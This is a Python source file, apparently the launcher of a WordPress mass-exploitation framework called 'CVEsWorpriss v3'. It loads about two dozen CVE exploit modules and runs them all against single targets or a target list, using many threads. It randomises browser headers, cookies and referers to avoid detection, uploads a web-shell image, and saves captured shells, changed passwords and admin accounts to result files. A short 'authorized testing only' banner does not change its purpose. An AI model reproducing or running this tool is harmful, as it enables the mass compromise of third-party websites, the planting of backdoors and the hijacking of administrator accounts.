import os
import random
import re
import time
import string
from multiprocessing.dummy import Pool
import requests
from colorama import Fore, init
from collections import OrderedDict
import urllib3
from bs4 import BeautifulSoup
import hashlib
import json
from urllib.parse import urljoin, urlparse
import importlib

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_CONFIG = {
    'TIMEOUT': 10,
    'UPLOAD_TIMEOUT': 15,
    'FILES_DIR': 'lib',
    'REQUIRED_FILES': ['inmymine-shell.jpg', 'mem.zip'],
    'RESULT_DIR': 'Result',
    'SHELLS_FILE': 'Shells.txt',
    'PASSWORDS_FILE': 'password_change.txt',
    'ADMINS_FILE': 'wp-admin.txt',
    'REGISTER_FILE': 'wp-register.txt',
    'UPDATE_URL': 'https://raw.githubusercontent.com/InMyMine7/InMyMine7/main/up.txt',
    'SUPPORT_URL': ['https://buymeacoffee.com/inmymine72'],
    'EMAIL': 'default@example.com'
}

CONFIG_FILE = 'config.json'
CONFIG = {}

EXPLOITS = {
    'CVE_2025_7852': 'lib.tools.exploit_cve_2025_7852.exploit_CVE_2025_7852',
    'cve_2024_2667': 'lib.tools.exploit_cve_2024_2667.exploit_cve_2024_2667',
    'cve_2024_9234': 'lib.tools.exploit_cve_2024_9234.exploit_cve_2024_9234',
    'CVE_2025_4606': 'lib.tools.exploit_cve_2025_4606.exploit_CVE_2025_4606',
    'cve_2025_5394': 'lib.tools.exploit_cve_2025_5394.exploit_cve_2025_5394',
    'cve_2021_25094': 'lib.tools.exploit_cve_2021_25094.exploit_cve_2021_25094',
    'CVE_2026_1357': 'lib.tools.exploit_CVE_2026_1357.exploit_CVE_2026_1357',
    'CVE_2026_3891': 'lib.tools.exploit_CVE_2026_3891.exploit_CVE_2026_3891',
    'cve_2025_48148': 'lib.tools.exploit_cve_2025_48148.exploit_CVE_2025_48148',
    'cve_2023_5360': 'lib.tools.exploit_cve_2023_5360.exploit_CVE_2023_5360',
    'cve_2025_6934': 'lib.tools.exploit_cve_2025_6934.exploit_cve_2025_6934',
    'cve_2024_56064': 'lib.tools.exploit_cve_2024_56064.exploit_CVE_2024_56064',
    'cve_2025_29009': 'lib.tools.exploit_cve_2025_29009.exploit_CVE_2025_29009',
    'CVE_2025_4334': 'lib.tools.exploit_CVE_2025_4334.exploit_CVE_2025_4334',
    'CVE_2025_6440': 'lib.tools.exploit_CVE_2025_6440.exploit_CVE_2025_6440',
    'cve_2025_7441': 'lib.tools.exploit_cve_2025_7441.exploit_cve_2025_7441',
    'CVE_2025_13374': 'lib.tools.exploit_CVE_2025_13374.exploit_CVE_2025_13374',
    'CVE_2025_15403': 'lib.tools.exploit_cve_2025_15403.exploit_rm_user_exists',
    'CVE_2026_0920': 'lib.tools.exploit_cve_2026_0920.exploit_cve_2026_0920',
    'CVE_2026_0740': 'lib.tools.exploit_cve_2026_0740.exploit_CVE_2026_0740',
    'CVE_2025_6389': 'lib.tools.exploit_cve_2025_6389.exploit_cve_2025_6389',
    'CVE_2025_47539': 'lib.tools.exploit_cve_2025_47539.exploit_cve_2025_47539',
    'CVE_2026_1357': 'lib.tools.exploit_CVE_2026_1357.exploit'

}

PROXIES = []

def load_config():
    global CONFIG
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                CONFIG = json.load(f)
        else:
            CONFIG = DEFAULT_CONFIG.copy()
            save_config()
    except Exception as e:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Failed to load config: {e}")
        CONFIG = DEFAULT_CONFIG.copy()

def save_config():
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(CONFIG, f, indent=4)
    except Exception as e:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Failed to save config: {e}")

load_config()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9,fr;q=0.8",
    "en-GB,en;q=0.9,de;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "es-ES,es;q=0.9,en;q=0.8",
]

REFERERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://duckduckgo.com/',
    'https://www.yahoo.com/',
    'https://www.facebook.com/',
    'https://x.com/',
    'https://www.linkedin.com/',
]

PLATFORMS = {
    "Windows": '"Windows"',
    "Mac OS X": '"macOS"',
    "Linux": '"Linux"',
    "Android": '"Android"',
    "iPhone": '"iOS"',
}

class Exploit:
    def __init__(self, url):
        self.url = self.normalize_url(url)
        self.session = requests.Session()
        self.headers = self.get_headers()
        self.proxy = random.choice(PROXIES) if PROXIES else None
        self.CONFIG = CONFIG

    def log_message(self, message, success=False, error=False):
        prefix = f"{Fore.GREEN}+" if success else f"{Fore.RED}-" if not error else f"{Fore.RED}!"
        print(f"{Fore.WHITE}[{prefix}{Fore.WHITE}] {self.url} {message}")

    def check_file(self, filename):
        file_path = os.path.join(self.CONFIG['FILES_DIR'], filename)
        if not os.path.exists(file_path):
            self.log_message(f"File {filename} not found", error=True)
            return False
        return True

    def simulate_browser_navigation(self):
        try:
            self.session.get(self.url, headers=self.headers, proxies=self.proxy, verify=False, timeout=self.CONFIG['TIMEOUT'])
            time.sleep(random.uniform(0.3, 1.5))
            self.session.get(f"{self.url}wp-login.php", headers=self.headers, proxies=self.proxy, verify=False, timeout=self.CONFIG['TIMEOUT'])
        except requests.RequestException:
            pass

    def random_cookie(self, length=16):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def random_email(self):
        name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        domain = random.choice(['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'])
        return f"{name}@{domain}"

    def random_filename(self, ext='php', length=8):
        name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        return f"{name}.{ext}"
    
    def random_password(self, prefix='mine', length=8):
        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        return prefix + suffix
    
    def get_headers(self):
        delay = random.uniform(0.5, 2.0)
        time.sleep(delay)
        user_agent = random.choice(USER_AGENTS)
        is_chrome = "Chrome" in user_agent or "Chromium" in user_agent or "Edg" in user_agent
        is_firefox = "Firefox" in user_agent
        is_safari = "Safari" in user_agent and not is_chrome
        is_mobile = "Mobile" in user_agent or "Android" in user_agent or "iPhone" in user_agent
        platform = next((p for k, p in PLATFORMS.items() if k in user_agent), '"Unknown"')
        headers = {
            'Connection': random.choice(['keep-alive', 'close']),
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': user_agent,
            'Accept': random.choice([
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'application/json, text/plain, */*',
                '*/*'
            ]),
            'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate', 'br']),
            'Accept-Language': random.choice(ACCEPT_LANGUAGES),
            'X-Requested-With': 'XMLHttpRequest',
            'Cookie': f'session={self.random_cookie()}; lang={random.choice(["en", "id", "fr", "es"])}; cf_clearance={self.random_cookie(32)}',
            'Sec-GPC': '1' if random.random() > 0.5 else None,
        }
        if random.random() > 0.1:
            headers['Referer'] = random.choice(REFERERS)
        if random.random() > 0.2:
            headers['DNT'] = str(random.randint(0, 1))
        if random.random() > 0.4:
            headers['Pragma'] = 'no-cache'
        if is_chrome:
            headers.update({
                'Sec-Ch-Ua': '"Chromium";v="129", "Not=A?Brand";v="8", "Google Chrome";v="129"' if "Chrome" in user_agent else '"Microsoft Edge";v="129", "Chromium";v="129", "Not=A?Brand";v="8"',
                'Sec-Ch-Ua-Mobile': '?1' if is_mobile else '?0',
                'Sec-Ch-Ua-Platform': platform,
                'Sec-Ch-Ua-Full-Version-List': '"Chromium";v="129.0.6668.71", "Not=A?Brand";v="8.0.0.0", "Google Chrome";v="129.0.6668.71"' if "Chrome" in user_agent else '"Microsoft Edge";v="129.0.2792.79", "Chromium";v="129.0.6668.71", "Not=A?Brand";v="8.0.0.0"',
                'Sec-Fetch-Dest': random.choice(['document', 'iframe', 'script', 'image']),
                'Sec-Fetch-Mode': random.choice(['navigate', 'no-cors', 'cors']),
                'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'same-site', 'cross-site']),
                'Sec-Fetch-User': '?1' if random.random() > 0.3 else None,
                'Priority': random.choice(['u=0, i', 'u=1', 'u=2']) if random.random() > 0.5 else None,
            })
        elif is_firefox:
            headers.update({
                'TE': 'trailers',
                'Sec-Fetch-Dest': random.choice(['document', 'script']),
                'Sec-Fetch-Mode': random.choice(['navigate', 'cors']),
                'Sec-Fetch-Site': random.choice(['none', 'same-origin']),
            })
        elif is_safari:
            headers.update({
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Priority': 'u=0, i' if random.random() > 0.5 else None,
            })
        headers = {k: v for k, v in headers.items() if v is not None}
        return OrderedDict(random.sample(list(headers.items()), len(headers)))

    def normalize_url(self, url):
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/') + '/'

    def run_all_exploits(self):
        self.log_message(f"Starting {len(EXPLOITS)} exploits...", success=True)
        for cve_name, exploit_path in EXPLOITS.items():
            try:
                self.run_single_exploit(cve_name, exploit_path)
                time.sleep(random.uniform(0.5, 1.5))  # delay di exploit
            except Exception as e:
                self.log_message(f"{cve_name} failed: {str(e)}", error=True)

    def run_single_exploit(self, cve_name, exploit_path):
        try:
            module_name, func_name = exploit_path.rsplit('.', 1)
            module = importlib.import_module(module_name)
            exploit_func = getattr(module, func_name)
            self.log_message(f"Running {cve_name}...", success=True)
            exploit_func(self)
            self.log_message(f"{cve_name} completed", success=True)
        except ImportError:
            self.log_message(f"{cve_name} module not found", error=True)
        except Exception as e:
            self.log_message(f"{cve_name} execution error: {str(e)}", error=True)

def ensure_result_directory():
    if not os.path.exists(CONFIG['RESULT_DIR']):
        os.makedirs(CONFIG['RESULT_DIR'])

def check_files():
    if not os.path.exists(CONFIG['FILES_DIR']):
        os.makedirs(CONFIG['FILES_DIR'])
    missing_files = [f for f in CONFIG['REQUIRED_FILES'] if not os.path.exists(os.path.join(CONFIG['FILES_DIR'], f))]
    if missing_files:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Missing required files: {', '.join(missing_files)}")
        return False
    return True

def print_banner():
    banner = f"""{Fore.GREEN}
   ______                           _______                       __    __                       __                _______
 /      \\                         |       \\                     |  \\  |  \\                     |  \\              |       \\
|  $$$$$$\\  ______   ______ ____  | $$$$$$$\\ __    __   ______  | $$  | $$ __    __  _______  _| $$_     ______  | $$$$$$$\\
| $$___\\$$ |      \\ |      \\    \\ | $$__/ $$|  \\  |  \\ /      \\ | $$__| $$|  \\  |  \\|       \\|   $$ \\   /      \\ | $$__| $$
 \\$$    \\   \\$$$$$$\\| $$$$$$\\$$$$\\| $$    $$| $$  | $$|  $$$$$$\\| $$    $$| $$  | $$| $$$$$$$\\\\$$$$$$  |  $$$$$$\\| $$    $$
 _\\$$$$$$\\ /      $$| $$ | $$ | $$| $$$$$$$\\| $$  | $$| $$  | $$| $$$$$$$$| $$  | $$| $$  | $$ | $$ __ | $$    $$| $$$$$$$\\
|  \\__| $$|  $$$$$$$| $$ | $$ | $$| $$__/ $$| $$__/ $$| $$__| $$| $$  | $$| $$__/ $$| $$  | $$ | $$|  \\| $$$$$$$$| $$  | $$
 \\$$    $$ \\$$    $$| $$ | $$ | $$| $$    $$ \\$$    $$ \\$$    $$| $$  | $$ \\$$    $$| $$  | $$  \\$$  $$ \\$$     \\| $$  | $$
  \\$$$$$$   \\$$$$$$$ \\$$  \\$$  \\$$ \\$$$$$$$   \\$$$$$$  _\\$$$$$$$ \\$$   \\$$  \\$$$$$$  \\$$   \\$$   \\$$$$   \\$$$$$$$ \\$$   \\$$
                                                      |  \\__| $$
                                                       \\$$    $$
                                                        \\$$$$$$

╔══════════════════════════════════════╗
║   CVEsWorpriss v3                    ║
║   WordPress Auto Exploit Framework   ║
║   Maintained by SamBugHunteR         ║
╚══════════════════════════════════════╝
{Fore.RED}WARNING: This tool is for authorized penetration testing only. Unauthorized use is illegal.
{Fore.WHITE}[{Fore.GREEN} WORDPRESS AUTO EXPLOIT {Fore.WHITE}] By {Fore.GREEN}SamBugHunteR{Fore.WHITE}
[{Fore.GREEN} Kali NetHunter Edition {Fore.WHITE}]


{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] 1. START EXPLOIT
{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] 2. CHECK ALL EXPLOITS
{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] 3. SUPPORT DEVELOPER >_

"""
    print(banner)

def load_targets():
    try:
        file_path = input(f"{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] ENTER YOUR LIST: ")
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] FILE NOT FOUND!")
        exit(1)
    except KeyboardInterrupt:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Operation cancelled by user.")
        exit(1)

def check_updates():
    try:
        headers = OrderedDict()
        response = requests.get(CONFIG['UPDATE_URL'], headers=headers, timeout=CONFIG['TIMEOUT']).text
        if '0.3' in response:
            print(f"\n{Fore.WHITE}[{Fore.GREEN}!{Fore.WHITE}] {response}{Fore.WHITE}[{Fore.GREEN}!{Fore.WHITE}] github.com/InMyMine7 or contact me in telegram @InMyMineee\n")
        else:
            print(f"\n{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] You are using the latest version\n")
    except requests.RequestException as e:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Failed to check updates: {e}")

def support_developer():
    print(f"\n{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] Support Developer:\n")
    
    for url in CONFIG['SUPPORT_URL']:
        print(f"{Fore.GREEN}➤ {Fore.CYAN}{url}")
    
    print()  # newline biar rapih

def main(url):
    try:
        if not check_files():
            return
        exploit = Exploit(url)
        exploit.run_all_exploits()
        
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Finished scanning {url}")
    except KeyboardInterrupt:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Operation cancelled by user.")
        exit(1)
    except Exception as e:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] {url} [General Error: {e}]")

def run_exploit_single():
    try:
        url = input(f"{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] Enter target URL: ").strip()
        if not url:
            print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] URL cannot be empty.")
            return

        ensure_result_directory()
        thread_count = int(input(f"{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] Enter number of threads (default 10): ") or 10)

        with Pool(thread_count) as pool:
            pool.map(main, [url])

    except KeyboardInterrupt:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Operation cancelled by user.")
        exit(1)
    except Exception as e:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Single Scan Error: {e}")

def mass_exploit():
    try:
        ensure_result_directory()
        targets = load_targets()
        thread_count = int(input(f"{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] Enter number of threads (default 10): ") or 10)
        with Pool(thread_count) as pool:
            pool.map(main, targets)
    except KeyboardInterrupt:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Operation cancelled by user.")
        exit(1)
    except Exception as e:
        print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Pool Error: {e}")

def main_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    try:
        choice = input(f"{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] : ")

        if choice == "1":
            os.system('cls' if os.name == 'nt' else 'clear')
            pilih = input(f"\n{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] 1. Mass Scan \n{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] 2. Single Scan \n\n{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] : ")
            if pilih == "1":
                mass_exploit()
            elif pilih == "2":
                run_exploit_single()
            else:
                print(f"\n{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Invalid option!")

        elif choice == "2":
            print(f"\n{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] Available exploits ({len(EXPLOITS)}):")
            for i, (cve, path) in enumerate(EXPLOITS.items(), 1):
                print(f"{Fore.WHITE}[{Fore.GREEN}{i}{Fore.WHITE}] {cve}")
            print(f"\n{Fore.WHITE}[{Fore.GREEN}~{Fore.WHITE}] All exploits will be tested automatically.")

        elif choice == "3":
            support_developer()

        else:
            print(f"\n{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Invalid option!")

    except KeyboardInterrupt:
        print(f"\n{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Operation cancelled by user.")
        exit(1)

if __name__ == "__main__":
    main_menu()
